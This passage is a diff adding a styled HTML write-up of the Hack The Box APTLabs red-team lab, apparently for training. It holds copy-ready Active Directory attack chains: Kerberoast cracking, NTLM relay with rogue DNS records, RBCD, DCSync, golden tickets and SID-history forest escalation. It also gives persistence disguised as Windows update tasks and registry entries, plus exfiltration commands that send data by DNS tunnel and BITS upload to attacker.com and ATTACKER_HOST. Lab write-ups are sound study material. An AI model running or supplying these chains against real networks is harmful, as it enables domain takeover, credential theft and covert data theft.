+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+        -r /usr/share/hashcat/rules/best64.rule
+
+# If that fails, apply NotSoSecure corporate rules
+git clone https://github.com/NotSoSecure/password_cracking_rules
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+        -r password_cracking_rules/OneRuleToRuleThemAll.rule
+
+# Try common corporate patterns as a custom wordlist too:
+# Company2023!, Company@123, Season+Year combos
+hashcat -m 13100 kerberoast_hashes.txt corporate_wordlist.txt --force</code></pre>
+</div>
+
+<h3 id="token-impersonation">Token Impersonation via SeImpersonatePrivilege</h3>
+
+<p>Service accounts running IIS, MSSQL, or similar Windows services frequently have the <code>SeImpersonatePrivilege</code> token assigned. If you land on a host as such a service account, you can impersonate the SYSTEM token using a local privilege escalation technique. Modern variants (PrintSpoofer, GodPotato, SweetPotato) work on fully patched Windows Server 2019 and 2022 and do not require a specific CVE.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Token impersonation — PrintSpoofer / GodPotato</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Check current token privileges
+execute-assembly /opt/tools/Seatbelt.exe TokenPrivileges
+
+# If SeImpersonatePrivilege is present:
+# Option A — PrintSpoofer (triggers spooler pipe impersonation)
+execute-assembly /opt/tools/PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe /c whoami"
+
+# Option B — GodPotato (works on Server 2022, Win 11)
+execute-assembly /opt/tools/GodPotato.exe -cmd "cmd /c whoami"
+
+# Option C — SweetPotato (StorSvc CLSID impersonation)
+execute-assembly /opt/tools/SweetPotato.exe -a "cmd.exe /c whoami"
+
+# Once SYSTEM, inject a new beacon into a SYSTEM process
+# (or migrate into lsass / winlogon for persistence)
+inject <PID_OF_WINLOGON> x64 <SYSTEM_LISTENER></code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="lateral">Phase 4 &mdash; Lateral Movement</h2>
+<span class="mitre-badge">T1550.002</span><span class="mitre-badge">T1557.001</span><span class="mitre-badge">T1558</span>
+
+<h3 id="smb-relay">SMB Relay &amp; NTLM Capture</h3>
+
+<p>NTLM relay is one of the core techniques in APTLabs. The setup requires two components: a listener that forces authentication (by responding to or poisoning DNS/NetBIOS lookups pointing victims at your host) and a relay server that forwards captured authentication to a target service. The target of the relay should be a host where the victim account is a local admin and where SMB signing is not enforced.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># SMB relay chain setup</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Step 1: Identify hosts without SMB signing
+nxc smb 10.10.10.0/24 --gen-relay-list targets_no_signing.txt
+
+# Step 2: Create a rogue DNS entry to redirect victim traffic to us
+# (requires domain user account with DNS write rights)
+python3 dnstool.py -u CORP\\jsmith -p 'Password123!' \
+        --action add --record WPAD --data 10.10.10.200 10.10.10.1
+
+# Step 3: Run ntlmrelayx targeting the no-signing host
+impacket-ntlmrelayx -tf targets_no_signing.txt -smb2support \
+        -socks -of ntlm_hashes.txt
+
+# Step 4: Optionally relay directly to LDAP to perform RBCD setup
+impacket-ntlmrelayx -t ldap://DC01.corp.local -smb2support \
+        --delegate-access --escalate-user jsmith$
+
+# Once socks proxy is running via ntlmrelayx:
+# Add to proxychains config and route Impacket tools through it</code></pre>
+</div>
+
+<h3 id="overpass-hash">Over-Pass-the-Hash</h3>
+
+<p>Pass-the-hash directly often fails against modern targets with Protected Users groups or Credential Guard enabled. The alternative is Over-Pass-the-Hash (OPtH): use an NTLM hash to request a full Kerberos TGT for the target account, then use that TGT for all subsequent authentication. This bypasses NTLM-based restrictions because the resulting authentication is Kerberos, which is generally unrestricted.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Over-Pass-the-Hash with Rubeus</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># OPtH: Use NTLM hash to get Kerberos TGT for target account
+execute-assembly /opt/tools/Rubeus.exe asktgt /user:svc_backup \
+        /rc4:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b \
+        /domain:corp.local /dc:DC01.corp.local /ptt
+
+# Verify TGT was injected into current session
+execute-assembly /opt/tools/Rubeus.exe tklist
+
+# Now use the TGT to WinRM / PSExec into the target
+# (Kerberos auth will succeed even if NTLM is blocked)
+powershell Enter-PSSession -ComputerName SRV02.corp.local -Authentication Kerberos</code></pre>
+</div>
+
+<h3 id="rbcd">Resource-Based Constrained Delegation (RBCD) Abuse</h3>
+
+<p>RBCD abuse is the technique most central to the intended path in APTLabs. The attack requires two preconditions: an account whose <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute you can write to (the target), and a controlled principal with a Service Principal Name (an existing service account or a machine account you create). The attack flow is:</p>
+
+<ol>
+  <li>Identify a target resource (e.g., a DC or server) whose RBCD attribute you can modify via an ACL misconfiguration.</li>
+  <li>Create or identify a controlled account with an SPN (machine accounts are ideal since you can create them if <code>MachineAccountQuota &gt; 0</code>).</li>
+  <li>Write your controlled account's SID into the target&rsquo;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li>
+  <li>Use S4U2Self + S4U2Proxy to get a service ticket to the target resource impersonating any user (e.g., Domain Admin).</li>
+</ol>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># RBCD Attack — Full Chain</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Step 1: Create a rogue machine account (if MachineAccountQuota allows)
+impacket-addcomputer corp.local/jsmith:'Password123!' \
+        -computer-name 'ROGUE$' -computer-pass 'Rogue@123!'
+
+# Step 2: Write RBCD — set ROGUE$ as allowed to delegate to DC01$
+impacket-rbcd corp.local/jsmith:'Password123!' \
+        -action write -delegate-from 'ROGUE$' \
+        -delegate-to 'DC01$' -dc-ip 10.10.10.1
+
+# Verify the attribute was written
+impacket-rbcd corp.local/jsmith:'Password123!' \
+        -action read -delegate-to 'DC01$' -dc-ip 10.10.10.1
+
+# Step 3: Get S4U ticket — impersonate Administrator on DC01
+impacket-getST corp.local/'ROGUE$':'Rogue@123!' \
+        -spn cifs/DC01.corp.local -impersonate Administrator \
+        -dc-ip 10.10.10.1
+
+# Step 4: Use the TGT (Administrator@cifs_DC01.ccache)
+export KRB5CCNAME=Administrator@cifs_DC01.corp.local.ccache
+impacket-psexec -k -no-pass DC01.corp.local
+
+# Verify you have SYSTEM on DC01
+whoami
+# nt authority\system</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Info &mdash; When MachineAccountQuota is 0</div>
+  <p>If the domain has <code>ms-DS-MachineAccountQuota</code> set to 0, you cannot create new computer accounts as a regular user. The workaround is to find an <em>existing</em> account whose SPN you can modify (e.g., via <code>GenericWrite</code> on a service account), add an SPN to that account, and use it as the delegation source in place of a newly created machine account.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="domain-domination">Phase 5 &mdash; Domain Domination</h2>
+<span class="mitre-badge">T1003.006</span><span class="mitre-badge">T1558.001</span>
+
+<h3 id="dcsync">DCSync Attack</h3>
+
+<p>DCSync abuses the Directory Replication Service (DRS) protocol. An account with the <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> extended rights (held by Domain Admins and Domain Controllers by default, but often granted to other principals via over-permissive ACLs) can simulate being a domain controller and &ldquo;pull&rdquo; any user&rsquo;s credentials from the real DC.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># DCSync — dump all domain hashes</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Option A: impacket-secretsdump (from Linux, Kerberos auth)
+export KRB5CCNAME=Administrator@cifs_DC01.corp.local.ccache
+impacket-secretsdump -k -no-pass DC01.corp.local -just-dc-ntlm
+
+# Option B: mimikatz via beacon (in-memory, from SYSTEM beacon on DC)
+execute-assembly /opt/tools/mimikatz.exe \
+        "lsadump::dcsync /domain:corp.local /all /csv" "exit"
+
+# Option C: lsassy (LSASS dump via built-in Windows features)
+execute-assembly /opt/tools/lsassy.exe -u Administrator \
+        -H aad3b435b51404eeaad3b435b51404ee:<NTHASH> DC01.corp.local
+
+# Key hashes to save from DCSync output:
+# - krbtgt   : needed for Golden Ticket
+# - Administrator : obvious
+# - All service accounts : reuse across domain
+# - Computer accounts    : needed for inter-forest attacks</code></pre>
+</div>
+
+<h3 id="golden-ticket">Golden Ticket Forgery</h3>
+
+<p>With the <code>krbtgt</code> hash in hand, you can forge Kerberos TGTs (Ticket Granting Tickets) for any user in the domain, valid for any service. Golden tickets are valid for 10 years by default and bypass most account lockout and password-change controls because the <code>krbtgt</code> hash rarely rotates. This is the apex of single-domain compromise.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Golden Ticket — Rubeus forge</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Get domain SID first
+execute-assembly /opt/tools/PowerView.ps1
+powershell Get-DomainSID
+# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
+
+# Forge Golden Ticket with Rubeus
+execute-assembly /opt/tools/Rubeus.exe golden \
+        /rc4:<KRBTGT_NTHASH> \
+        /domain:corp.local \
+        /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+        /user:Administrator \
+        /ptt
+
+# Alternatively with mimikatz
+execute-assembly /opt/tools/mimikatz.exe \
+        "kerberos::golden /domain:corp.local /user:BackdoorAdmin \
+        /sid:S-1-5-21-XXX-XXX-XXX /rc4:<KRBTGT_HASH> /ptt" "exit"
+
+# Verify ticket is loaded
+execute-assembly /opt/tools/Rubeus.exe tklist</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="trust-abuse">Phase 6 &mdash; Multi-Domain &amp; Forest Escalation</h2>
+<span class="mitre-badge">T1482</span><span class="mitre-badge">T1134.005</span>
+
+<h3 id="domain-trust-enumeration">Enumerating Trust Relationships</h3>
+
+<p>APTLabs involves multiple domains and at least one cross-forest trust boundary. Domain trusts are the bridges between these kingdoms. Once a domain is fully compromised, enumerate all trusts it participates in and determine their direction and transitivity.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Trust enumeration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Enumerate all trusts from current domain
+powershell Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType,TrustAttributes
+
+# Check for forest trusts specifically
+powershell Get-ForestTrust
+
+# Map all domains in the forest
+powershell Get-ForestDomain | select Name,DomainControllers
+
+# Enumerate cross-forest users (if trust allows)
+powershell Get-DomainUser -Domain partner.forest -Server DC01.partner.forest</code></pre>
+</div>
+
+<h3 id="child-parent">Child Domain to Parent Forest Escalation</h3>
+
+<p>If the lab environment includes a child domain structure (child.corp.local under corp.local), the child-to-parent escalation via SID history injection is a core technique. A domain admin in the child domain can forge a TGT that includes the SID of the parent domain's <code>Enterprise Admins</code> group in its SID history field, granting full control over the parent domain.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Child to Parent via SID History — Mimikatz</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Required:  krbtgt hash of CHILD domain
+#            SID of PARENT domain Enterprise Admins group
+
+# Get child domain krbtgt hash (already done from child DCSync)
+# Get Enterprise Admins SID from parent domain
+impacket-lookupsid corp.local/Administrator:<HASH>@DC01.corp.local | grep "Enterprise Admins"
+# Enterprise Admins SID: S-1-5-21-PARENT-XXX-XXX-XXX-519
+
+# Forge inter-realm Golden Ticket with extra SID (Enterprise Admins)
+execute-assembly /opt/tools/Rubeus.exe golden \
+        /rc4:<CHILD_KRBTGT_HASH> \
+        /domain:child.corp.local \
+        /sid:S-1-5-21-CHILD-DOMAIN-SID \
+        /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
+        /user:Administrator \
+        /target:corp.local \
+        /ptt
+
+# Use the forged ticket to access parent DC
+ls \\DC01.corp.local\C$
+impacket-psexec -k -no-pass DC01.corp.local</code></pre>
+</div>
+
+<h3 id="cross-forest">Cross-Forest Kerberoasting &amp; Trust Ticket Abuse</h3>
+
+<p>Bidirectional forest trusts (or even unidirectional external trusts where the trusted forest accounts can authenticate to the trusting forest) open up cross-forest Kerberoasting. Accounts from the trusted forest that have SPNs registered in the trusting forest can be Kerberoasted from the trusting forest&rsquo;s perspective, yielding hashes for accounts in the partner forest.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Cross-forest Kerberoasting</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># From inside corp.local, Kerberoast accounts in partner.forest
+impacket-GetUserSPNs corp.local/Administrator -target-domain partner.forest \
+        -dc-ip DC01.partner.forest -hashes :&lt;NTHASH&gt; -request
+
+# Crack the cross-forest TGS hashes
+hashcat -m 13100 crossforest_hashes.txt /usr/share/wordlists/rockyou.txt \
+        -r password_cracking_rules/OneRuleToRuleThemAll.rule
+
+# Alternative: request inter-realm TGT for partner forest
+# Get the inter-realm trust key (found in LSA secrets on DC)
+impacket-secretsdump -k -no-pass DC01.corp.local -just-dc | grep "partner.forest"
+
+# Forge inter-forest trust ticket
+execute-assembly /opt/tools/Rubeus.exe silver \
+        /rc4:&lt;TRUST_KEY&gt; \
+        /domain:corp.local \
+        /sid:S-1-5-21-CORP-SID \
+        /user:Administrator \
+        /target:partner.forest \
+        /service:krbtgt \
+        /sids:S-1-5-21-PARTNER-ENTERPRISE-ADMINS-SID \
+        /ptt</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Warning &mdash; SID Filtering</div>
+  <p>Cross-forest trusts have SID filtering enabled by default, which blocks SID history injection across the forest boundary. The child-to-parent SID history technique works <em>within</em> a forest (intra-forest trusts have filtering disabled by default). For cross-forest escalation, you need either a misconfigured trust with <code>SIDFilteringForestAware = False</code>, or you need to compromise accounts <em>native</em> to the target forest and pivot from there using traditional lateral movement.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="persistence">Phase 7 &mdash; Persistence</h2>
+<span class="mitre-badge">T1546.003</span><span class="mitre-badge">T1053.005</span><span class="mitre-badge">T1574.001</span>
+
+<h3 id="wmi-subscriptions">WMI Event Subscriptions</h3>
+
+<p>WMI event subscriptions are the gold standard for fileless, high-privilege persistence. A subscription consists of an EventFilter (trigger condition: e.g., on system startup, or on every N minutes), an EventConsumer (action: CommandLineEventConsumer runs a command, ActiveScriptEventConsumer runs a VBScript), and a FilterToConsumerBinding linking the two. Properly written WMI subscriptions survive reboots, are invisible to standard process listings, and are rarely checked by blue teams who are focused on file-based persistence.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># WMI Event Subscription — PowerShell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># WMI Persistence — triggers every system startup, runs beacon loader
+# Delivered via PowerShell from SYSTEM beacon
+
+powershell @"
+`$Filter = Set-WmiInstance -Class '__EventFilter' -Namespace 'root\subscription' -Arguments @{
+    Name = 'WindowsUpdateCheck'
+    EventNamespace = 'root\cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+`$Consumer = Set-WmiInstance -Class 'CommandLineEventConsumer' -Namespace 'root\subscription' -Arguments @{
+    Name = 'WindowsUpdateConsumer'
+    CommandLineTemplate = 'powershell.exe -nop -w hidden -enc &lt;BASE64_STAGER&gt;'
+}
+
+Set-WmiInstance -Class '__FilterToConsumerBinding' -Namespace 'root\subscription' -Arguments @{
+    Filter = `$Filter
+    Consumer = `$Consumer
+}
+"@</code></pre>
+</div>
+
+<h3 id="scheduled-tasks">Scheduled Tasks</h3>
+
+<p>Scheduled tasks are noisier than WMI subscriptions but easier to troubleshoot and more reliable across different Windows versions. Use a name that blends into the existing task scheduler entries (e.g., <code>MicrosoftEdgeUpdateTaskMachineCore</code>, <code>WindowsDefenderScheduledScan</code>). Store the payload in a path that appears legitimate.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Scheduled task persistence</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Create a disguised scheduled task running on logon as SYSTEM
+schtasks /create /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display" \
+         /tr "powershell.exe -nop -w hidden -enc &lt;BASE64&gt;" \
+         /sc ONLOGON /ru SYSTEM /f
+
+# Verify creation
+schtasks /query /tn "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display"
+
+# For lateral persistence on remote host (if admin access):
+impacket-atexec corp.local/Administrator:&lt;HASH&gt;@TARGET_HOST \
+        "powershell -nop -w hidden -enc &lt;BASE64&gt;"</code></pre>
+</div>
+
+<h3 id="registry-hijacking">Registry Hijacking &amp; DLL Sideloading</h3>
+
+<p>Registry-based persistence (Run keys, Image File Execution Options, AppInit_DLLs) is well-known but still effective when combined with a living-off-the-land binary. The technique is to point a Run key at a legitimate LOLBin (<code>mshta.exe</code>, <code>regsvr32.exe</code>, <code>certutil.exe</code>) with arguments that pull and execute the payload. DLL sideloading places a malicious DLL in a path that a legitimate application searches before its intended DLL location &mdash; it executes when the legitimate application starts.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Registry Run key persistence (HKCU — no admin needed)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># HKCU Run key (persists for current user, no admin required)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
+        /v "OneDriveStandaloneUpdater" \
+        /t REG_SZ \
+        /d "powershell.exe -nop -w hidden -enc &lt;BASE64&gt;" /f
+
+# HKLM Run key (requires admin, persists for all users)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
+        /v "AdobeUpdateService" \
+        /t REG_SZ \
+        /d "C:\ProgramData\Adobe\updater.exe" /f
+
+# Image File Execution Options (debugger hijack — triggers on any process start)
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" \
+        /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc.exe" /f</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="exfiltration">Phase 8 &mdash; Exfiltration</h2>
+<span class="mitre-badge">T1048</span><span class="mitre-badge">T1041</span>
+
+<h3 id="data-staging">Data Staging with LOLBins</h3>
+
+<p>Staging simulates the real-world APT behavior of collecting and compressing sensitive data before exfiltration. APTLabs rewards this as a demonstration that you understand the full adversary workflow beyond just capturing flags. Native tools (<code>certutil</code>, <code>bitsadmin</code>, <code>compress</code>) avoid introducing new binaries and blend into normal administrative activity.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># Data staging with native Windows tools</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Compress a directory of interesting files (7zip via cmd or native compress)
+powershell Compress-Archive -Path C:\Users -DestinationPath C:\Windows\Temp\sys_backup.zip
+
+# Encode to base64 for exfil (certutil — native Windows utility)
+certutil -encode C:\Windows\Temp\sys_backup.zip C:\Windows\Temp\sys_b64.txt
+
+# Alternative staging: use xcopy to a UNC path (your relay / C2 server)
+xcopy /s /e C:\Sensitive \\ATTACKER_HOST\share\
+
+# Check file for ADS (Alternate Data Streams) — can hide staged data
+type secret.txt > legitimate_doc.docx:hidden_stream
+more < legitimate_doc.docx:hidden_stream</code></pre>
+</div>
+
+<h3 id="exfil-channels">Exfiltration Channels</h3>
+
+<p>DNS tunneling is the most covert exfiltration channel in monitored environments because DNS queries rarely trigger alerts and most firewalls permit outbound DNS. HTTPS exfil via the C2 channel is simpler and faster but more visible if traffic inspection is in place. In APTLabs, exfiltration via the existing C2 HTTPS channel is usually sufficient since there is no active blue team monitoring.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><span class="filename"># DNS tunneling exfil (iodine / dnscat2)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># On attacker C2 server: run dnscat2 server
+ruby dnscat2.rb --dns port=53,domain=exfil.attacker.com --secret=mysecret
+
+# On victim machine: run dnscat2 client (executable or PowerShell version)
+.\dnscat2.exe --secret=mysecret exfil.attacker.com
+
+# Alternatively: encode data in DNS TXT record queries (manual)
+# Each query exfils 63 bytes (max label length)
+powershell $data = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\secret.txt"))
+powershell $chunks = $data -split "(.{60})" | Where-Object {$_}
+powershell foreach($chunk in $chunks){ Resolve-DnsName "$chunk.exfil.attacker.com" -Type TXT }
+
+# HTTPS exfil via BITS (Background Intelligent Transfer Service — LOLBin)
+bitsadmin /transfer "WindowsUpdate" /upload https://attacker.com/upload C:\Windows\Temp\staged.zip</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="tips">Key Tips &amp; Lessons Learned</h2>
+
+<h3 id="tip-hashes">Credential Management After Each Reset</h3>
+<p>Build a persistent notes file (Obsidian, Notion, or a local markdown) that stores every recovered credential, hash, TGT, and access path in a structured format. After each daily reset, you will replay access using stored material rather than re-running attacks from scratch. Organize by network segment and machine name. Include the exact Impacket or Rubeus commands needed to re-authenticate, so recovery is a matter of copy-paste.</p>
+
+<h3 id="tip-dns">DNS Manipulation is Central to Relay Attacks</h3>
+<p>Modern corporate networks have LLMNR and NBT-NS disabled, which kills traditional Responder-style poisoning. APTLabs requires you to understand how to <strong>create and modify DNS records</strong> as an authenticated domain user to redirect traffic. The Krbrelayx toolkit&rsquo;s <code>dnstool.py</code> script is essential. Study how to add, modify, and clean up DNS records to avoid leaving obvious forensic artifacts.</p>
+
+<h3 id="tip-cracking">Password Cracking Beyond Rockyou</h3>
+<p>The Rockyou wordlist was compiled from a 2009 breach and reflects consumer password habits. Corporate environments use different patterns: company name + year + special character, seasonal passwords (Winter2023!), department-specific patterns. The <a href="https://github.com/NotSoSecure/password_cracking_rules" target="_blank" rel="noopener">NotSoSecure OneRuleToRuleThemAll</a> Hashcat ruleset applies thousands of corporate-style mutations to a base wordlist and dramatically improves hit rate on Kerberoast and NTLM hashes.</p>
+
+<h3 id="tip-opsec">Operational Security in a Monitored Environment</h3>
+<p>Although APTLabs has no active blue team, the security controls (AV, EDR hooks, PowerShell logging) are real and will kill carelessly delivered payloads. Key OPSEC principles that make or break progress here: always prefer in-memory execution (<code>execute-assembly</code>) over disk drops; use <code>obfuscated</code> PowerShell (encoding, variable substitution) rather than raw commands; clean up created artefacts (scheduled tasks, DNS entries, WMI subscriptions) after your access path changes; and keep beacon sleep intervals high except when actively doing work.</p>
+
+<div class="callout callout-success">
+  <div class="callout-title">Summary &mdash; Why APTLabs Is Worth It</div>
+  <p>The techniques in APTLabs &mdash; RBCD, relay chains with DNS manipulation, cross-forest trust escalation, OPSEC-conscious payload delivery &mdash; are the exact same techniques showing up in real-world breach reports from groups like Scattered Spider, ALPHV affiliates, and nation-state actors. No CVE-of-the-month will teach you to chain misconfigured ACLs into a Golden Ticket and pivot across a forest boundary. APTLabs will. The two-month grind is a bargain for what you internalize.</p>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2 id="references">References &amp; Further Reading</h2>
+
+<ul>
+  <li><a href="https://www.hackthebox.com/hacker/pro-labs" target="_blank" rel="noopener">HTB Pro Labs — Official Page</a></li>
+  <li><a href="https://avantguard.io/en/blog/aptlabs-review" target="_blank" rel="noopener">APTLabs Review — avantguard.io (Pascal Sommer)</a></li>
+  <li><a href="https://github.com/NotSoSecure/password_cracking_rules" target="_blank" rel="noopener">NotSoSecure Password Cracking Rules (Hashcat)</a></li>
+  <li><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noopener">Krbrelayx — Kerberos relay toolkit (dnstool.py)</a></li>
+  <li><a href="https://bloodhound.readthedocs.io" target="_blank" rel="noopener">BloodHound Documentation</a></li>
+  <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket — fortra/impacket</a></li>
+  <li><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus — GhostPack</a></li>
+  <li>HTB Academy: Active Directory Enumeration &amp; Attacks, Kerberos Attacks, Active Directory Trust Attacks</li>
+</ul>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>HTB APTLabs — Full Chain Red Team Writeup &nbsp;&middot;&nbsp; Techniques for Educational Purposes Only &nbsp;&middot;&nbsp; 2026</p>
+</footer>
+
+<script>
+// ── Three.js Background ───────────────────────────────────
+(function(){
+  const c = document.getElementById('three-bg');
+  const r = new THREE.WebGLRenderer({canvas:c, alpha:true, antialias:true});
+  r.setSize(window.innerWidth, window.innerHeight);
+  r.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+  const s = new THREE.Scene();
+  const cam = new THREE.PerspectiveCamera(55, window.innerWidth/window.innerHeight, 0.1, 1000);
+  cam.position.z = 55;
+
+  // Dodecahedron — the 12-faced solid mirrors the multi-domain complexity
+  const geo = new THREE.DodecahedronGeometry(18, 0);
+  const mat = new THREE.MeshBasicMaterial({
+    color: 0x2dd4bf, wireframe: true, transparent: true, opacity: 0.12
+  });
+  const mesh = new THREE.Mesh(geo, mat);
+  s.add(mesh);
+
+  // Second ghost mesh — offset and dimmer
+  const geo2 = new THREE.IcosahedronGeometry(28, 0);
+  const mat2 = new THREE.MeshBasicMaterial({
+    color: 0x60a5fa, wireframe: true, transparent: true, opacity: 0.06
+  });
+  const mesh2 = new THREE.Mesh(geo2, mat2);
+  s.add(mesh2);
+
+  // Floating particles — data exfil aesthetic
+  const pts = [];
+  for(let i = 0; i < 500; i++){
+    pts.push(new THREE.Vector3(
+      (Math.random() - 0.5) * 160,
+      (Math.random() - 0.5) * 160,
+      (Math.random() - 0.5) * 160
+    ));
+  }
+  const pgeo = new THREE.BufferGeometry().setFromPoints(pts);
+  const pmat = new THREE.PointsMaterial({color: 0x2dd4bf, size: 0.28, transparent: true, opacity: 0.35});
+  const particles = new THREE.Points(pgeo, pmat);
+  s.add(particles);
+
+  function animate(){
+    requestAnimationFrame(animate);
+    mesh.rotation.x  += 0.0012;
+    mesh.rotation.y  += 0.0018;
+    mesh2.rotation.x -= 0.0006;
+    mesh2.rotation.z += 0.001;
+    particles.rotation.y += 0.0003;
+    r.render(s, cam);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    cam.aspect = window.innerWidth / window.innerHeight;
+    cam.updateProjectionMatrix();
+    r.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+
+// ── Copy Button ────────────────────────────────────────────
+function copyCode(btn){
+  const code = btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ── Build TOC ──────────────────────────────────────────────
+function buildToc(){
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const tocD = document.getElementById('tocDesktop');
+  const tocM = document.getElementById('tocMobile');
+  let html = '';
+  headings.forEach(h => {
+    if(!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls = h.tagName === 'H3' ? 'toc-h3' : '';
+    // Strip MITRE badge text from TOC label
+    const label = h.textContent.replace(/T\d{4}(\.\d{3})?/g,'').trim();
+    html += `<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${label}</a></li>`;
+  });
+  tocD.innerHTML = html;
+  tocM.innerHTML = html;
+}
+buildToc();
+
+// ── Active Section Tracking ────────────────────────────────
+function trackActiveSection(){
+  const links = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if(entry.isIntersecting){
+        links.forEach(l => l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l => l.classList.add('active'));
+      }
+    });
+  }, {rootMargin: '-80px 0px -65% 0px', threshold: 0});
+  headings.forEach(h => observer.observe(h));
+}
+trackActiveSection();
+
+// ── Mobile TOC Toggle ──────────────────────────────────────
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+document.getElementById('tocMobile').addEventListener('click', e => {
+  if(e.target.tagName === 'A') toggleMobileToc();
+});
+</script>
+</body>
+</html>
